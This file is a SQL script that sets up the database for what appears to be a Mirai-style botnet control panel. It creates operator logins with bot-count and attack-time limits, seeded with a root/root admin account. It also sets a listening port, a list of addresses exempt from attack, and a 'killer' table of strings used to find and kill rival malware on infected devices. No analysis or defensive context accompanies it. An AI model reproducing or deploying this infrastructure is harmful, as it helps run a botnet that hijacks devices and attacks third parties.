create database botnet;
use botnet;

CREATE TABLE `logins` (
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `botcount` varchar(32) NOT NULL,
  `time` varchar(32) NOT NULL,
  `admin` varchar(32) NOT NULL,
  KEY `username` (`username`)
);
INSERT INTO logins VALUES ('root', 'root', "-1", "3600", "1");

CREATE TABLE `ports` (
  `port` varchar(32) NOT NULL,
  KEY `port` (`port`)
);
INSERT INTO ports VALUES ('48101');

CREATE TABLE `blacklisted` (
  `host` varchar(32) NOT NULL,
  KEY `host` (`host`)
);
INSERT INTO blacklisted VALUES ('127.0.0.1');
INSERT INTO blacklisted VALUES ('192.168.0.1');
INSERT INTO blacklisted VALUES ('1.1.1.1');
INSERT INTO blacklisted VALUES ('8.8.8.8');
INSERT INTO blacklisted VALUES ('10.0.0.0');

CREATE TABLE `killer` (
  `
file` varchar(32) NOT NULL,
  `string` varchar(128) NOT NULL,
  KEY `file` (`file`)
);
INSERT INTO killer VALUES ('/maps', '/tmp/');
INSERT INTO killer VALUES ('/exe', 'UPX');
INSERT INTO killer VALUES ('/cmdline', '.arm7');
